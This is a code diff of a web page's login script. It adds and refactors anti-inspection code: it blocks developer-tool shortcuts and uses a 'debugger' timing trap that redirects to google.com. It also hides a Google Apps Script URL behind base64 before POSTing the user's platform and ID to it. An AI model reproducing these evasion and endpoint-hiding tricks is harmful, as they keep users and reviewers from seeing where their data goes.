@@ -55,12 +55,10 @@
   onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">
   <script>
     setInterval(() => {
-      const before = new Date().getTime();
+      const t = new Date().getTime();
       debugger;
-      const after = new Date().getTime();
-      if (after - before > 100) {
-        window.location.replace("https://google.com");
-      }
+      const d = new Date().getTime();
+      if (d - t > 100) location.replace("https://google.com");
     }, 1000);
   </script>
 
@@ -177,10 +175,11 @@
     document.getElementById("userId").disabled = false;
   }
 
-  // تشفير رابط Google Script
-  const encoded = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcw==";
-  const scriptPath = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec";
-  const safeURL = atob(encoded) + scriptPath;
+  // تشفير وهمي للرابط مع مفتاح ثابت
+  function decodeLink(key) {
+    let original = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcw==");
+    return original + key;
+  }
 
   function secureLogin() {
     const platform = document.getElementById("platform").value;
@@ -202,10 +201,13 @@
     document.getElementById("platform").disabled = true;
     document.getElementById("userId").disabled = true;
 
+    sessionStorage.setItem("authorized", "true");
     localStorage.setItem("platform", platform);
     localStorage.setItem("userId", userId);
 
-    fetch(safeURL, {
+    const url = decodeLink("AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec");
+
+    fetch(url, {
       method: "POST",
       mode: "no-cors",
       headers: { "Content-Type": "application/json" },
